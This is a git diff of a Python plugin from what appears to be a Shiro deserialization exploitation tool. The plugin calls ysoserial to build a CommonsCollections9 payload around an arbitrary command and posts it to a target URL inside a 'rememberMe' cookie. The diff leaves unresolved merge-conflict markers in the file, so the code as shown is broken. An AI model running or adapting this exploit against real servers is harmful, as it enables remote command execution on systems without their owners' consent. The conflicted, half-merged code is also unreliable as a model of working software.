@@ -18,6 +18,7 @@ JAR_FILE = 'moule/ysoserial.jar'
 @Idea.plugin_register('Class12:CommonsCollections9')
 class CommonsCollections9(object):
     def process(self,url,command,resKey,func):
+<<<<<<< HEAD
         self.sendPayload(url,command,resKey)
 
 
@@ -44,7 +45,15 @@ class CommonsCollections9(object):
         return payload
 
     def sendPayload(self,url,command,resKey,fp=JAR_FILE):
+=======
+        # self.poc(url,command, thre,resKey)
+        self.sendPayload(url,command,resKey)
 
+>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
+
+    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
+        key = resKey
+        target = url
         if not os.path.exists(fp):
             raise Exception('jar file not found!')
         popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections9', command],       #popen
@@ -61,6 +70,7 @@ class CommonsCollections9(object):
             }
             
         try:
+<<<<<<< HEAD
             x = requests.post(url,  headers=header, cookies={'rememberMe': payloadCBC.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
             y = requests.post(url,  headers=header, cookies={'rememberMe': payloadGCM.decode()+"="},verify=False, timeout=20)  # 发送验证请求2
             #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
@@ -72,4 +82,17 @@ class CommonsCollections9(object):
         except Exception as e:
             print(e)
             return False
+=======
+            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
+            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
+            if(r.status_code==200):
+ 
+                print("[+]   ****CommonsCollections9模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
+            else:
+                print("[-]   ****CommonsCollections9模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
+        except Exception as e:
+            print(e)
+            return False
+
+>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
 
